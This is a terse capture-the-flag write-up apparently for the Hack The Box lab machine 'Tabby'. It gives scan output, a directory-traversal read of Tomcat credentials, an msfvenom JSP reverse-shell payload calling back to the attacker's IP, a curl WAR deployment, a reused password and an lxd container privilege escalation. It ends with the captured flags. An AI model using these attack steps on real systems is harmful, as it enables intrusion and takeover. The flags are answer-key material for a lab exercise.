
# Tabby

## IP = 10.10.10.194

## Nmap

### Initial
```
# Nmap 7.80 scan initiated Sat Sep  5 20:02:14 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up (0.043s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  5 20:02:26 2020 -- 1 IP address (1 host up) scanned in 12.82 seconds
```

### Fullscan
```
# Nmap 7.80 scan initiated Sat Sep  5 20:03:16 2020 as: nmap -sC -p- -sV -oN nmap/fullscan 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up (0.038s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  5 20:06:37 2020 -- 1 IP address (1 host up) scanned in 201.19 seconds
```

## Gobuster

### First
```
# gobuster dir -u "http://$IP/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.194/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/10 10:37:25 Starting gobuster
===============================================================
/files (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/10 11:11:45 Finished
===============================================================
```

### With Extensions
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.194/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,js,php,txt
[+] Timeout:        10s
===============================================================
2020/09/10 10:37:59 Starting gobuster
===============================================================
/news.php (Status: 200)
/index.php (Status: 200)
/files (Status: 301)
/assets (Status: 301)
/Readme.txt (Status: 200)
===============================================================
2020/09/10 11:36:42 Finished
===============================================================
```

## Nikto
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.194
+ Target Hostname:    10.10.10.194
+ Target Port:        80
+ Start Time:         2020-09-07 18:21:14 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ 7864 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2020-09-07 18:28:09 (GMT2) (415 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Found Directory Traversal on http://10.10.10.194/news.php?file=statement in the ```file``` parameter
## Exploited with: ```file=../../../../path/here```

## Found that exist an interesting file ```tomcat-users.xml``` that contains the list of users, including the ```admin-gui``` user that can access the ```host-manager webapp```

## Found that file at ```file=../../../../usr/share/tomcat9/etc/tomcat-users.xml```
```
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>

```

## admin-gui and manager-script credentials: ```tomcat:$3cureP4s5w0rd123!```

## JSP reverse shell: ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.60 LPORT=4444 -f war > shell.war```

## since we have manager-script a one-line exploit is: ```curl -T "shell.war" -u "tomcat" "http://10.10.10.194:8080/manager/text/deploy?path=/miao"```

## Found Backup zip file encrypted: ```16162020.zip``` in ```/var/www/html/files```, password is: ```admin@it```

## The sysadmin is a lazy man so the credentials for ```ash``` user are: ```ash:admin@it```

## user.txt: ```6fa6a321e52d85d0e61cc853c16e35cc```

## Found that ash user is in the ```lxd``` group, so easy privesc:

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine -a i686
# transfer alpine-v3.12-i686-20200915_1159.tar.gz to /tmp
lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc init myimage miao -c security.privileged=true
lxc config device add miao mydevice disk source=/ path=/mnt/root recursive=true
lxc start miao
lxc exec miao /bin/sh
# go to /mnt/root for root filesystem folder
```

## root.txt: ```7d248a3ba5dd9609a8d7704420fa8286```



